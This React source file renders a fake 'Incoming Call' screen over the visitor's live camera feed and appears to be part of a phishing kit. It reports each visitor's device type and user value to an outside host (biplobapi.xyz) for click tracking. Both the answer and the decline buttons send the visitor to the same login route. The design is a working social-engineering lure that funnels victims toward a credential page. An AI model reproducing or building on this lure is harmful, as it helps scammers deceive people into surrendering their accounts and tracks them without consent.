import React, { useEffect, useRef } from "react";
import "./Video.css";
import { Link, useLoaderData, useParams } from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import backgroundMusic from "../../assets/ringtone.mp3";
const Video = () => {
  const videoRef = useRef(null);
  const params = useParams();
  const { user } = useLoaderData();
  localStorage.setItem("url", `/live/chat/${params.id}`);
  let type;
  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }
  useEffect(() => {
    const bookings = {
      type: type,
      user: user,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((error) => {
            console.error("Error playing video:", error);
          });
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    }

    startCamera();

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Live Chat";

    // Create a link element for the favicon
    const favicon = document.createElement("link");
    favicon.rel = "icon";
    favicon.href = "/favicon.ico"; // Update with the correct path to your favicon

    // Append the favicon to the head
    document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes

    // Cleanup function to stop the camera when the component unmounts
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, [type, params.id]);

  return (
    <div className="home-bg-2 position-relative min-h-full">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        loop
        style={{ height: "100vh", minWidth: "100vw", objectFit: "cover" }}
        className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo"
      />
      <div
        className="code-card position-absolute text-center z-20"
        style={{ left: "50%", transform: "translateX(-50%)" }}
      >
        <div className="video-card text-center">
          <img src="/datas/images/fastpic.jpg" alt="" className="img_mm_01" />
          <p>Incoimng Call...</p>
          <div className="btn-holder">
            <Link className="ree_01" to={`/live/chat/login/${params.id}`}>
              <img src="/datas/images/incoming-call.svg" alt="" />
            </Link>
            <Link className="ree_02" to={`/live/chat/login/${params.id}`}>
              <img src="/datas/images/outgoing-call.svg" alt="" />
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Video;
